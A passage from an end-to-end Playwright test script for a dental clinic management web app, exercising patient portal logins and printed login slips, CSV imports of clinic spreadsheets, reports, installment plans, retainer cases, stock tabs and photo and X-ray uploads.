  await m.locator('input[type=email]').fill('lookalike-1705@dralirashid.com');
  await m.getByRole('button', { name: 'Create account' }).click();
  await pl.locator('.toast', { hasText: 'shape of a patient login' }).waitFor();
});

await step('the invitation by email is refused for an address at the clinic domain, and still works for a real one', async () => {
  await pl.keyboard.press('Escape').catch(() => {});
  const ids = await pl.evaluate(async () => {
    const { state } = await import('/js/state.js');
    const mk = async (full_name, email) => (await state.data.createPatient({ full_name, phone: '0300 1112223', email, first_branch_id: 1 })).id;
    return { planted: await mk('Planted Address', 'newdoc@dralirashid.com'), real: await mk('Real Address', 'real.address@example.com') };
  });
  await pl.goto(BASE + `#/staff/patient/${ids.planted}`);
  await pl.waitForSelector('h1:has-text("Planted Address")');
  await pl.getByRole('button', { name: 'Invite to patient portal' }).click();
  await pl.locator('.toast', { hasText: 'Use Create portal login for clinic usernames.' }).waitFor();
  await pl.locator('.portal-login-line', { hasText: 'Portal login: none yet' }).waitFor(); // nothing was linked
  await pl.goto(BASE + `#/staff/patient/${ids.real}`);
  await pl.waitForSelector('h1:has-text("Real Address")');
  await pl.getByRole('button', { name: 'Invite to patient portal' }).click();
  await pl.locator('.toast', { hasText: 'Invitation sent to real.address@example.com' }).waitFor();
  await pl.locator('.portal-login-line', { hasText: 'Portal login: own email (invited)' }).waitFor();
  expectErrors(/Use Create portal login for clinic usernames/);
});

await step('the login slip keeps the username in one piece before the @, sets a long one smaller, and even the longest username prints on one A6 page', async () => {
  const name = 'Muhammad Abdul Rehman Siddiqui Al Hashmi'; // the name part is cut to 24 letters
  const cases = [['Ali Rashid', '1705'], [name, '1705'], [name, '9'.repeat(10)], [name, '9'.repeat(30)]]; // 14, 29, 35 and 55 characters before the @
  const measured = await pl.evaluate(async ({ cases }) => {
    const { loginSlip } = await import('/js/views/staff/portal-login.js');
    const holder = document.createElement('div');
    holder.style.cssText = 'position:fixed;left:0;top:0;width:351px;background:#fff;z-index:99999'; // an A6 page between its 6 mm margins, on screen
    document.body.append(holder);
    const rows = [];
    for (const [fullName, mr] of cases) {
      const username = fullName.toLowerCase().replace(/[^a-z0-9]/g, '').slice(0, 24) + '-' + mr + '@dralirashid.com';
      const slip = loginSlip({ full_name: fullName, mr_number: mr }, username, 'queen-sheep-zebra-9876');
      holder.replaceChildren(slip);
      const user = slip.querySelector('.slip-user');
      const parts = [...user.querySelectorAll('.slip-nowrap')];
      const edge = slip.getBoundingClientRect().right - parseFloat(getComputedStyle(slip).paddingRight);
      const pw = [...slip.querySelectorAll('.slip-value')].at(-1);
      rows.push({
        username, text: user.textContent, font: parseFloat(getComputedStyle(user).fontSize), lines: parts.map((s) => s.getClientRects().length),
        inside: parts.every((s) => s.getBoundingClientRect().right <= edge + 0.5), passwordFits: pw.scrollWidth <= pw.clientWidth + 0.5,
        domainBelow: parts.length === 2 ? parts[1].getBoundingClientRect().top >= parts[0].getBoundingClientRect().bottom - 1 : null,
      });
    }
    holder.remove();
    return rows;
  }, { cases });
  for (const r of measured) {
    assert.equal(r.text, r.username, 'the markup does not change the text');
    assert.deepEqual(r.lines, [1, 1], `${r.username}: the name, dash and Mr# never split over two lines (and the domain stays whole)`);
    assert.ok(r.inside, `${r.username} fits inside the slip`);
    assert.ok(r.passwordFits, `the password of a slip with ${r.username} fits too`);
  }
  const sizes = measured.map((r) => r.font);
  assert.ok(sizes[0] > sizes[1] && sizes[1] > sizes[2] && sizes[2] > sizes[3], `a longer username is set smaller: ${sizes.join(' > ')}`);
  assert.ok(measured[3].domainBelow || measured[3].domainBelow === false, 'the longest wraps (or not) only between the name part and the @');
  // The longest one on the real slip dialog prints on one A6 page.
  await pl.evaluate(async ({ username }) => {
    const { showLoginSlip } = await import('/js/views/staff/portal-login.js');
    showLoginSlip({ full_name: 'Muhammad Abdul Rehman Siddiqui Al Hashmi', mr_number: '9'.repeat(30) }, username, 'queen-sheep-zebra-9876');
  }, { username: measured[3].username });
  await pl.waitForSelector('.login-slip');
  const pdf = await pl.pdf({ preferCSSPageSize: true, printBackground: true });
  const pages = (pdf.toString('latin1').match(/\/Type\s*\/Page[^s]/g) || []).length;
  assert.equal(pages, 1, 'the longest username still prints on one page');
  const box = pdf.toString('latin1').match(/MediaBox\s*\[\s*0\s+0\s+([\d.]+)\s+([\d.]+)\s*\]/);
  assert.ok(box && Math.abs(Number(box[1]) - 297.6) < 3 && Math.abs(Number(box[2]) - 419.5) < 3, 'and it is A6');
  await pl.getByRole('button', { name: 'Close' }).first().click();
});

// Makes a portal login for a new patient the way the front desk does, and returns what is on the slip.
const makeLoginFor = async (fullName) => {
  await pl.evaluate(async (n) => { const { state } = await import('/js/state.js'); await state.data.createPatient({ full_name: n, phone: '0300 1112223', first_branch_id: 1 }); }, fullName);
  await openPatient(fullName);
  await pl.getByRole('button', { name: 'Create portal login' }).click();
  const m = pl.locator('.modal');
  const made = { username: await m.locator('input[readonly]').inputValue(), password: await m.getByLabel('Password').inputValue() };
  await m.getByRole('button', { name: 'Create login' }).click();
  await pl.waitForSelector('.login-slip');
  await pl.getByRole('button', { name: 'Close' }).first().click();
  return made;
};
// Logs a patient in with the slip and fills the "Choose your own password" screen (with the stand-in for getPatient already in place when asked).
const firstLogin = async (made, { failPortal = false, next = 'my-own-pass-88' } = {}) => {
  await logOut({ staff: true });
  await pl.goto(BASE + '#/login/patient');
  const form = pl.locator('form');
  await form.locator('input[name=username]').fill(made.username.split('@')[0]);
  await form.locator('input[type=password]').fill(made.password);
  await form.locator('input[type=password]').press('Enter');
  await pl.waitForSelector('h1:has-text("Choose your own password")');
  if (failPortal) {
    await pl.evaluate(async () => {
      const { state } = await import('/js/state.js');
      window.__realGetPatient ||= state.data.getPatient;
      state.data.getPatient = async () => { throw new Error('Failed to fetch'); }; // the connection drops right after the password is saved
    });
  }
  const fields = pl.locator('input[autocomplete=new-password]');
  await fields.nth(0).fill(next);
  await fields.nth(1).fill(next);
  await pl.getByRole('button', { name: 'Save my password' }).click();
};
const restorePortal = () => pl.evaluate(async () => { const { state } = await import('/js/state.js'); if (window.__realGetPatient) state.data.getPatient = window.__realGetPatient; });

await step('after the forced new password, a portal that cannot load shows a card with "Try again" instead of a "Loading your account…" that never ends', async () => {
  const made = await makeLoginFor('Retry Card');
  await firstLogin(made, { failPortal: true });
  await pl.getByRole('heading', { name: 'We could not open your account' }).waitFor();
  const card = await pl.locator('.login-card').innerText();
  assert.match(card, /Your new password is saved\./);
  assert.match(card, /We could not reach the clinic system/, 'in the patient\'s words, no database text');
  assert.equal(await pl.getByText('Loading your account').count(), 0, 'not a stuck loading screen');
  assert.equal(await pl.getByRole('button', { name: 'Try again' }).count(), 1);
  assert.equal(await pl.getByRole('button', { name: 'Log out' }).count(), 1);
  assert.ok(await pl.evaluate(() => document.activeElement?.tagName === 'H1'), 'the heading has the focus');
  await shot(pl, '18-portal-could-not-open');
  await pl.getByRole('button', { name: 'Try again' }).click(); // still failing: the card comes back
  await pl.getByRole('heading', { name: 'We could not open your account' }).waitFor();
  await restorePortal();
  await pl.getByRole('button', { name: 'Try again' }).click(); // the connection is back
  await pl.waitForSelector('h1:has-text("Hello, Retry")');
  assert.equal(await pl.locator('h1:has-text("Choose your own password")').count(), 0);
  expectErrors(/Failed to fetch/);
});
await step('the same card has a Log out button that leaves the account', async () => {
  await logOut();
  await pl.goto(BASE + '#/login/staff');
  await pl.getByRole('button', { name: /Dr. Ali Rashid/ }).click();
  await pl.waitForSelector('.topbar');
  const made = await makeLoginFor('Logout Card');
  await firstLogin(made, { failPortal: true });
  await pl.getByRole('heading', { name: 'We could not open your account' }).waitFor();
  await pl.getByRole('button', { name: 'Log out' }).click();
  await pl.waitForFunction(() => location.hash === '#/');
  await pl.waitForSelector('.door');
  await restorePortal();
  // The password was saved before the connection dropped: the new one works and opens the portal directly.
  await pl.goto(BASE + '#/login/patient');
  const form = pl.locator('form');
  await form.locator('input[name=username]').fill(made.username);
  await form.locator('input[type=password]').fill('my-own-pass-88');
  await form.locator('input[type=password]').press('Enter');
  await pl.waitForSelector('h1:has-text("Hello, Logout")');
  expectErrors(/Failed to fetch/);
});

await step('Dr. Ali imports a Healthwire transactions export on the Import page', async () => {
  await p7.goto(BASE + '#/staff/admin?tab=import');
  await p7.waitForSelector('h2:text("1. Payments and invoices")');
  const csv = [
    "Dr. Ali Rashid's Dental Clinic,,,,,,,,,,,,,,,", ',,,,,,,,,,,,,,,', 'Financial Transaction Report,,,,,,,,,,,,,,,',
    'Invoice#,MR#,Patient Name,Patient Phone#,Location,Description,Total,Cash,Discount,Dues,Advance,Mode Of Payment,Created By,Updated By,Discounted By,Payment Date',
    '900006,7991,Import Test One,3009990001,-,Braces First Payment,150000,40000,110000,0,0,Cash ,RJ Mall Clinic,RJ Mall Clinic,,01/08/2026 - 12:36AM',
    '134007,9557,Import Test Two lhr,3001112223,-,"Braces Monthly Payment,brackets",8000,4000,0,4000,0,Debit/Credit Card ,Lahore Gulberg Clinic,Lahore Gulberg Clinic,,05/08/2026 - 06:00PM',
    'Totals:,,,,,,158000,44000,110000,4000,0,,,,,', ''].join('\n');
  await p7.locator('input[type=file]').first().setInputFiles({ name: 'Transactions Report.csv', mimeType: 'text/csv', buffer: Buffer.from(csv) });
  await p7.waitForSelector('.stat:has-text("Invoices")');
  const text = await p7.locator('main').innerText();
  assert.match(text, /Rs 44,000/);
  assert.match(text, /Lahore/);
  await p7.getByRole('button', { name: /Import this file: 2 patients, 2 invoices, 2 payments, 2 visits/ }).click();
  await p7.waitForSelector('.alert:has-text("Invoices: 2 added")');
  assert.match(await p7.locator('.alert').innerText(), /Patients: 2 added/);
});
await step('Dr. Ali imports an Aaj ki List tab: branch and date chosen, visits with doctors land on the patients', async () => {
  await p7.goto(BASE + '#/staff/admin?tab=import');
  await p7.waitForSelector('h2:text("4. Aaj ki List history")');
  // Rows: an Mr#; no Mr# but the phone and first name of a patient file (the only way a row without an Mr# is matched, never a name
  // alone); no Mr# and a phone nobody has (not matched, listed afterwards); no Mr# and a Treatment that says checkup (a checkup patient,
  // not a visit: not counted and not sent; those go to the checkup list through "5. Checkup list").
  const csv = [
    "Tt Mr #,Tt Patient Name,Monthly,Tt Treatment,Token No,Waiting,Group,Doctor's Name,Tt Treatment Details,P.P,Healthwire,Tt Contact No,Reminder Status",
    '9811,Areeba Siddiqui,4,Monthly,3,Completed,,"Dr. Hina (sample), Assistant Uzma (sample)",U L 016 Pc refresh,,Done,,',
    ',Hamza Qureshi,8,Monthly,4,Completed,Group 3,Dr Nida,U L 018,,,0301 0734521,Called',
    ',Nobody Here At All,,Filling,5,Completed,,Dr. Nobody Listed,,,,0300 5550000,',
    ',Checkup Only Sample,,Checkup,6,Completed,,Dr Nida,,,,0300 5550999,',
    ''].join('\n');
  const aaj = p7.locator('section.panel:has(h2:text("4. Aaj ki List history")) input[type=file]');
  await aaj.setInputFiles({ name: 'aaj-ki-list-sample.csv', mimeType: 'text/csv', buffer: Buffer.from(csv) });
  await p7.waitForSelector('section[data-tab]');
  await p7.locator('section[data-tab] select[aria-label^="Branch for"]').selectOption('2');
  await p7.locator('section[data-tab] input[type=date]').fill('2026-08-20');
  await p7.locator('section[data-tab] input[type=date]').dispatchEvent('change');
  await p7.waitForSelector('button:has-text("Import 3 visits")');
  assert.match(await p7.locator('main').innerText(), /Dr\. Nobody Listed \(1\)/, 'unknown doctor name listed');
  await p7.locator('.alert:has-text("1 row has no Mr# and a Treatment that says checkup")').waitFor();
  await p7.getByRole('button', { name: 'Import 3 visits' }).click();
  await p7.waitForSelector('.alert:has-text("Visits: 2 added")');
  const text = await p7.locator('main').innerText();
  assert.match(text, /Doctors and assistants added to 3 visit slots/);
  assert.match(text, /Checkup patients not imported as visits: 1/);
  assert.match(text, /1 names could not be matched/);
  const unmatched = await p7.locator('table.list', { has: p7.locator('th', { hasText: 'Name on the sheet' }) }).locator('tbody').innerText();
  assert.match(unmatched, /Nobody Here At All/);
  assert.doesNotMatch(unmatched, /Checkup Only Sample/, 'the checkup row is skipped, not listed as a patient that could not be matched');
  await p7.goto(BASE + '#/staff/patients');
  await p7.fill('input[type=search]', '9811');
  await p7.locator('table.list tbody tr:has-text("9811") a').first().click();
  await p7.waitForSelector('h2:has-text("Money")');
  const visitText = await p7.locator('main').innerText();
  assert.match(visitText, /20 Aug 2026/);
  assert.match(visitText, /Aaj ki List \(aaj-ki-list-sample\)/);
  await shot(p7, '12-import-healthwire');
});

await step('Dr. Ali adds a treatment on the Clinic setup page and it reaches the sheet dropdown', async () => {
  await p7.goto(BASE + '#/staff/admin?tab=setup');
  await p7.waitForSelector('h2:text("Treatments")');
  assert.ok((await p7.locator('h2:text("Branches")').count()) && (await p7.locator('h2:text("Doctors and assistants")').count()));
  await p7.locator('section', { hasText: 'Treatments' }).getByRole('button', { name: 'New treatment' }).click();
  const m = p7.locator('.modal');
  await m.getByLabel('Name').fill('Night guard');
  await m.getByLabel('Default price').fill('15000');
  await m.getByRole('button', { name: 'Save' }).click();
  await p7.waitForSelector('.toast:has-text("Saved")');
  await p7.waitForSelector('td:text("Night guard")');
  await p7.goto(BASE + '#/staff/sheet');
  await p7.waitForSelector('#sheet-treatments', { state: 'attached' });
  assert.ok(await p7.locator('#sheet-treatments option[value="Night guard"]').count());
  await shot(p7, '13-clinic-setup');
});
await step('Dr. Ali adds a doctor group on the Clinic setup page (the sheet has a Group 4) and the Aaj ki List offers it in the Group drop-down and the Group filter, dark red as on the sheet', async () => {
  await p7.goto(BASE + '#/staff/admin?tab=setup');
  await p7.locator('section', { hasText: 'Doctor groups' }).getByRole('button', { name: 'New group' }).click();
  const m = p7.locator('.modal');
  await m.getByLabel('Group number').fill('4');
  await m.getByLabel('Name').fill('Group 4');
  await m.getByRole('button', { name: 'Save' }).click();
  await p7.waitForSelector('td:text("Group 4")');
  await p7.goto(BASE + '#/staff/sheet?branch=1');
  const group = p7.locator('table.sheet tbody tr:not(.is-checkup) select[aria-label^="Doctor group for"]').first();
  await group.waitFor();
  assert.deepEqual(await group.locator('option').allInnerTexts(), ['No group', 'Group 1', 'Group 2', 'Group 3', 'Group 4']);
  assert.deepEqual(await p7.locator('select[aria-label="Filter by doctor group"] option').allInnerTexts(), ['Any group', 'Group 1', 'Group 2', 'Group 3', 'Group 4']);
  const was = await group.inputValue();
  const who = (await group.getAttribute('aria-label')).replace('Doctor group for ', '');
  const groupOf = () => p7.locator(`select[aria-label="Doctor group for ${who}"]`);
  await groupOf().selectOption('4');
  await p7.waitForFunction((w) => document.querySelector(`select[aria-label="Doctor group for ${w}"]`)?.classList.contains('gs-darkred'), who);
  await groupOf().selectOption(was); // (as it was, for the steps below)
  await p7.waitForFunction(([w, v]) => { const s = document.querySelector(`select[aria-label="Doctor group for ${w}"]`); return s && s.value === v && !s.classList.contains('gs-darkred'); }, [who, was]);
});

await step('Reports: families and report tabs like the Healthwire financial report', async () => {
  await p7.locator('.topnav .menu:has-text("Reports") > button').click();
  await p7.locator('.topnav .menu-list a:has-text("Financial")').click();
  await p7.waitForSelector('.report-groups .tab[aria-selected="true"]:has-text("Financial")');
  const tabs = (await p7.locator('.report-tabs .tab').allTextContents()).map((t) => t.trim());
  for (const t of ['Transactions', 'Summary', 'Payment mode', 'Procedures', 'Income statement', 'Doctors share', 'Pending payments', 'Advance payments', 'Void invoices', 'Refunds', 'Discounts', 'Statistics', 'Cost per patient']) assert.ok(tabs.includes(t), t);
  await p7.waitForSelector('h2:text("Transactions")');
  await p7.locator('input[aria-label="From"]').fill('2020-01-01');
  await p7.locator('input[aria-label="From"]').dispatchEvent('change');
  await p7.waitForSelector('.report-table tbody tr');
  assert.ok(await p7.locator('.stat:has-text("Received")').count());
  await p7.locator('.report-tabs .tab:has-text("Income statement")').click();
  await p7.waitForSelector('h2:text("Income statement by month")');
  await p7.locator('.report-tabs .tab:has-text("Pending payments")').click();
  await p7.waitForSelector('h2:text("Pending payments by branch")');
  await p7.locator('.report-tabs .tab:has-text("Doctors share")').click();
  await p7.waitForSelector('h2:text("Doctors share")');
  await p7.locator('.report-groups .tab:has-text("OPD")').click();
  await p7.waitForSelector('h2:text("OPD by day")');
  await p7.locator('.report-groups .tab:has-text("Inventory")').click();
  await p7.waitForSelector('h2:text("Stock levels")');
  await p7.locator('.report-groups .tab:has-text("HR")').click();
  await p7.locator('.report-tabs .tab:has-text("Logins")').click();
  await p7.waitForSelector('h2:text("Staff accounts")');
  await p7.locator('.report-groups .tab:has-text("Financial")').click();
  await p7.waitForSelector('h2:text("Transactions")');
  await shot(p7, '14-reports');
});

await step('installment plan: set up on the patient page, overdue shows for the coordinator', async () => {
  await p7.goto(BASE + '#/staff/patients');
  await p7.waitForSelector('table.list tbody tr');
  await p7.click('table.list tbody tr:has(.badge:has-text("Braces")) a');
  await p7.waitForSelector('h3:text("Installment plan")');
  await p7.getByRole('button', { name: /Set up a plan|New plan/ }).click();
  const m = p7.locator('.modal');
  await m.getByLabel('Total to pay').fill('60000');
  await m.getByLabel('Number of installments').fill('3');
  const past = new Date(); past.setMonth(past.getMonth() - 2);
  await m.getByLabel('First installment due').fill(past.toISOString().slice(0, 10));
  await m.getByLabel('First installment due').dispatchEvent('change');
  await m.getByLabel('Count payments from').fill(past.toISOString().slice(0, 10));
  await m.getByRole('button', { name: 'Save plan' }).click();
  await p7.waitForSelector('.toast:has-text("Installment plan saved")');
  await p7.waitForSelector('.badge:has-text("Overdue")');
  // Take a payment against the oldest unpaid invoice: the form offers the invoice list.
  await p7.getByRole('button', { name: 'Take payment' }).click();
  await p7.locator('.modal').getByLabel('For invoice').waitFor();
  await p7.locator('.modal').getByRole('button', { name: 'Cancel' }).click();
  await p7.goto(BASE + '#/staff/coordinator?tab=reminders');
  await p7.waitForSelector('h2:text("Installments due")');
  assert.ok(await p7.locator('.badge:has-text("Overdue")').count());
  await shot(p7, '15-installments-due');
});

await step('braces off → retainer case with a next check date, on the patient file and on the Retainer Record of the city', async () => {
  await p7.goto(BASE + '#/staff/patients');
  await p7.waitForSelector('table.list tbody tr');
  await p7.click('table.list tbody tr:has(.badge:has-text("Braces")) a');
  await p7.waitForSelector('h2:has-text("Braces")');
  const who = (await p7.locator('h1').first().innerText()).trim();
  await p7.getByRole('button', { name: 'Edit case' }).click();
  await p7.locator('.modal').getByLabel('Case status').selectOption('debonded');
  await p7.locator('.modal').getByRole('button', { name: 'Save' }).click();
  await p7.waitForSelector('.modal:has-text("start the retainer case")');
  await p7.locator('.modal').getByRole('button', { name: 'Start retainer case' }).click();
  await p7.waitForSelector('.toast:has-text("Retainer case started")');
  await p7.waitForSelector('h2:text("Retainers")');
  assert.ok(await p7.locator('th:text("Next check")').count(), 'the patient file shows the next check');
  // The patient is on the Retainer Record of their city, linked to the file.
  await p7.getByRole('link', { name: 'Open the Retainer Record' }).click();
  await p7.locator('table.rs-table tbody a', { hasText: who }).first().waitFor();
  // The old Coordinator tab sends people to the new page.
  await p7.goto(BASE + '#/staff/coordinator?tab=retainers');
  await p7.waitForURL(/#\/staff\/retainers/);
  await p7.waitForSelector('table.rs-table');
});

await step('braces off, by a doctor who works at one branch only: the retainer case of a patient first registered at another branch is started at the doctor\'s branch', async () => {
  const pb = await newPage();
  await loginAs(pb, 'Dr. Ali Rashid');
  // Dr. Bushra works at North Nazimabad only; Areeba Siddiqui (braces) was first registered at Gulshan.
  const pid = await pb.evaluate(async () => {
    const { state } = await import('/js/state.js');
    await state.data.updateStaffBranches('s-doc', [2]);
    return (await state.data.searchPatients('Areeba Siddiqui')).find((x) => x.full_name === 'Areeba Siddiqui').id;
  });
  await tryAnotherRole(pb);
  await loginAs(pb, 'Dr. Bushra');
  await pb.goto(BASE + `#/staff/patient/${pid}`);
  await pb.waitForSelector('h2:has-text("Braces")');
  await pb.getByRole('button', { name: 'Edit case' }).click();
  await pb.locator('.modal').getByLabel('Case status').selectOption('debonded');
  await pb.locator('.modal').getByRole('button', { name: 'Save' }).click();
  await pb.locator('.modal').getByRole('button', { name: 'Start retainer case' }).click();
  await pb.waitForSelector('.toast:has-text("Retainer case started")');
  const row = await pb.evaluate(async (id) => {
    const { state } = await import('/js/state.js');
    const r = (await state.data.retainerRecords({ cityId: 1 })).find((x) => x.patient_id === id && x.source === 'website');
    return r && [r.branch_id, r.city_id, r.status];
  }, pid);
  assert.deepEqual(row, [2, 1, 'Impression taken'], 'on the Karachi tab, at North Nazimabad (not refused at Gulshan)');
  await pb.close();
});

await step('medical history is saved and shown on the patient page', async () => {
  await p7.goto(BASE + '#/staff/patients');
  await p7.waitForSelector('table.list tbody tr');
  await p7.click('table.list tbody tr:first-child a');
  await p7.waitForSelector('h2:has-text("Money")');
  await p7.getByRole('button', { name: 'Edit', exact: true }).click();
  await p7.locator('.modal label:has-text("Diabetes") input').check();
  await p7.locator('.modal').getByLabel('Allergies').fill('penicillin');
  await p7.locator('.modal label:has-text("Treatment consent form signed") input').check();
  await p7.locator('.modal').getByRole('button', { name: 'Save' }).click();
  await p7.waitForSelector('.toast:has-text("Saved")');
  await p7.waitForSelector('p:has-text("Medical:")');
  assert.match(await p7.locator('p:has-text("Medical:")').innerText(), /Diabetes.*penicillin/);
  assert.ok(await p7.locator('.badge:has-text("Consent signed")').count());
});

await step('Aaj ki List: all branches view and the day download button; on a 1366px laptop its Branch column makes the list scroll sideways rather than squeeze Treatment Details', async () => {
  await p7.goto(BASE + '#/staff/sheet?branch=all');
  await p7.waitForSelector('table.sheet');
  await p7.waitForSelector('th:text("Branch"):not([hidden])');
  assert.ok((await p7.locator('table.sheet tbody tr').count()) >= 1);
  assert.ok(await p7.getByRole('button', { name: 'Download' }).count());
  assert.equal(await p7.locator('.add-panel:not([hidden])').count(), 0);
  const cols = await p7.evaluate(() => {
    const th = (t) => [...document.querySelectorAll('table.sheet thead th')].find((x) => x.textContent.replace('▾', '').trim() === t);
    const details = th('Treatment Details');
    const wrap = document.querySelector('.sheet-wrap');
    const spill = [...document.querySelectorAll('table.sheet tbody .details-cell')].filter((c) => [...c.children].some((el) => el.getBoundingClientRect().right > c.closest('td').getBoundingClientRect().right + 0.5)).length;
    const input = document.querySelector('table.sheet tbody input[aria-label^="Treatment details for"]');
    return { viewport: window.innerWidth, branch: Math.round(th('Branch').getBoundingClientRect().width), details: Math.round(details.getBoundingClientRect().width),
      headCut: details.scrollWidth > details.clientWidth, input: Math.round(input.getBoundingClientRect().width), sideScroll: wrap.scrollWidth > wrap.clientWidth, spill };
  });
  assert.equal(cols.viewport, 1366);
  assert.ok(cols.branch >= 100 && cols.details >= 250 && !cols.headCut && cols.input >= 200, 'Treatment Details keeps its room: ' + JSON.stringify(cols));
  assert.ok(cols.sideScroll && cols.spill === 0, 'the list scrolls sideways and nothing spills out of the details cell: ' + JSON.stringify(cols));
  await p7.locator('select[aria-label="Branch"]').selectOption({ index: 1 });
  await p7.waitForSelector('.add-panel:not([hidden])');
});

await step('stock: receive and use items, low-stock warning', async () => {
  await p7.goto(BASE + '#/staff/stock');
  await p7.waitForSelector('h2:has-text("Stock ·")');
  assert.ok(await p7.locator('.alert-warning:has-text("reorder level")').count(), 'demo seed has a low item');
  assert.ok(await p7.locator('.reorder-list h2:has-text("Reorder list")').count(), 'reorder list for the supplier');
  assert.ok(await p7.locator('.reorder-list button:has-text("Download for the supplier")').count());
  await p7.locator('.reorder-list ~ section tr', { hasText: '014 NiTi wire' }).getByRole('button', { name: '+ Received' }).click();
  await p7.locator('.modal').getByLabel('Quantity').fill('20');
  await p7.locator('.modal').getByRole('button', { name: 'Save' }).click();
  await p7.waitForSelector('.toast:has-text("Stock updated")');
  await p7.waitForSelector('tr:has-text("014 NiTi wire") td:has-text("23 pcs")');
  assert.equal(await p7.locator('.reorder-list tr:has-text("014 NiTi wire")').count(), 0, 'restocked item leaves the reorder list');
  assert.ok(await p7.locator('h2:has-text("Recent moves")').count());
  await shot(p7, '16-stock');
});

await step('stock: one tab per branch in the clinic\'s order, then a Total tab that adds up all branches', async () => {
  const tabNames = await p7.locator('[role="tablist"][aria-label="Branch"] [role="tab"]').allInnerTexts();
  assert.equal(tabNames[tabNames.length - 1], 'Total', `the last tab is Total: ${tabNames.join(', ')}`);
  assert.ok(tabNames.length >= 3, 'the branches, then Total');
  await p7.getByRole('tab', { name: 'Total' }).click();
  await p7.waitForSelector('h2:has-text("Total stock · all branches")');
  const row = p7.locator('tr', { hasText: '014 NiTi wire' });
  const cells = await row.locator('td.right').allInnerTexts();
  const nums = cells.map((c) => Number.parseInt(c, 10));
  assert.equal(nums[nums.length - 1], nums.slice(0, -1).reduce((a, b) => a + b, 0), `the Total column is the sum of the branches: ${cells.join(' | ')}`);
  assert.equal(await p7.getByRole('button', { name: '+ Received' }).count(), 0, 'the Total tab is read only');
  assert.match(p7.url(), /branch=all/);
  await p7.getByRole('tab', { name: tabNames[0] }).click();
  await p7.waitForSelector(`h2:has-text("Stock · ${tabNames[0]}")`);
});

await step('edited photo upload is marked for the patient and the website', async () => {
  await p7.goto(BASE + '#/staff/patients');
  await p7.waitForSelector('table.list tbody tr');
  await p7.click('table.list tbody tr:first-child a');
  await p7.waitForSelector('h2:has-text("Photos and X-rays")');
  await p7.locator('.profile-uploads').getByRole('button', { name: 'Upload picture' }).click();
  await p7.setInputFiles('.modal input[type=file]', { name: 'after.png', mimeType: 'image/png', buffer: Buffer.from('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==', 'base64') });
  await p7.locator('.modal label:has-text("Edited before/after") input').check();
  await p7.locator('.modal').getByRole('button', { name: 'Upload' }).click();
  await p7.waitForSelector('.toast:has-text("uploaded")');
  await p7.waitForSelector('figcaption:has-text("edited (patient sees it)")');
});

// The owner (15 Oct 2026): "there should be a upload picture and upload x ray button on all patient profile and consent form upload
// button with add or delete option too". The three buttons sit together near the top of every profile, each for those who may use it.
const pu = await newPage();
let puPatient = null; // the profile used by these steps: { url, name }
const uploadButtons = (pg) => pg.locator('.profile-uploads button').allInnerTexts();
const onePixel = (name) => ({ name, mimeType: 'image/png', buffer: Buffer.from('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==', 'base64') });
await step('patient profile upload buttons per role: the front desk has "Upload consent form" only (at the top and in the Documents panel, beside Add document)', async () => {
  await loginAs(pu, 'Front desk \\(North Nazimabad\\)');
  await pu.goto(BASE + '#/staff/patients');
  await pu.waitForSelector('table.list tbody tr');
  await pu.click('table.list tbody tr:first-child a');
  await pu.waitForSelector('h2:has-text("Photos and X-rays")');
  puPatient = { url: pu.url(), name: await pu.locator('h1').innerText() };
  assert.deepEqual(await uploadButtons(pu), ['Upload consent form']);
  assert.equal(await pu.locator('.photos-panel button').count(), 0, 'no picture or X-ray buttons in the Photos and X-rays panel');
  const docs = pu.locator('section.panel', { has: pu.locator('h2:has-text("Documents")') });
  assert.deepEqual(await docs.locator('h2:has-text("Documents") + .inline button').allInnerTexts(), ['Upload consent form', 'Add document']);
});
await step('assistant: all three buttons; Upload X-ray saves into the X-ray store and the new X-rays show in Photos and X-rays as X-rays', async () => {
  await tryAnotherRole(pu);
  await loginAs(pu, 'Assistant');
  await pu.goto(puPatient.url);
  await pu.waitForSelector('h2:has-text("Photos and X-rays")');
  assert.deepEqual(await uploadButtons(pu), ['Upload picture', 'Upload X-ray', 'Upload consent form']);
  assert.deepEqual(await pu.locator('.photos-panel .panel-head button').allInnerTexts(), ['Upload picture', 'Upload X-ray'], 'the same two in the panel');
  await pu.locator('.profile-uploads').getByRole('button', { name: 'Upload X-ray' }).click();
  const m = pu.locator('.modal');
  await m.locator(`h2:has-text("Upload X-ray · ${puPatient.name}")`).waitFor();
  const input = m.locator('input[type=file]');
  assert.equal(await input.getAttribute('accept'), 'image/*', 'images (a phone or tablet offers the camera)');
  assert.equal(await input.evaluate((el) => el.multiple), true, 'several at once');
  await m.getByRole('button', { name: 'Upload' }).click();
  await m.getByText('Choose at least one X-ray.').waitFor();
  await input.setInputFiles([onePixel('opg-1.png'), onePixel('opg-2.png')]);
  await m.getByLabel('Type').selectOption('Periapical (PA)');
  await m.getByRole('button', { name: 'Upload' }).click();
  await pu.waitForSelector('.toast:has-text("2 X-rays uploaded.")');
  await m.waitFor({ state: 'detached' });
  const tiles = pu.locator('.photos-panel figure.xray-tile');
  await tiles.first().waitFor();
  assert.equal(await tiles.count(), 2, 'both X-rays are in the panel straight away');
  assert.match(await tiles.first().locator('figcaption').innerText(), /^X-ray .*Periapical \(PA\)/);
  assert.equal(await tiles.first().locator('img').getAttribute('alt'), 'X-ray (Periapical (PA))');
  assert.ok((await tiles.first().locator('img').getAttribute('src')).startsWith('data:image/png'), 'the X-ray image is shown');
  await shot(pu, '31-patient-upload-buttons');
});
await step('Upload picture on the profile: several at once, camera and gallery both on a phone (no capture attribute), no "X-ray / OPG" view', async () => {
  await pu.locator('.profile-uploads').getByRole('button', { name: 'Upload picture' }).click();
  const m = pu.locator('.modal');
  await m.locator(`h2:has-text("Upload picture · ${puPatient.name}")`).waitFor();
  const input = m.locator('input[type=file]');
  assert.equal(await input.getAttribute('accept'), 'image/*');
  assert.equal(await input.evaluate((el) => el.multiple), true, 'several at once');
  assert.equal(await input.getAttribute('capture'), null, 'no capture attribute: a phone offers the camera and the gallery');
  assert.equal(await m.getByLabel('View').locator('option', { hasText: 'X-ray' }).count(), 0, 'X-rays go in with Upload X-ray');
  await m.getByRole('button', { name: 'Cancel' }).click();
  await m.waitFor({ state: 'detached' });
});
await step('Upload X-ray on a weak connection: it says how far it is, stays open while it works, and after a lost answer Upload again sends only the rest, once', async () => {
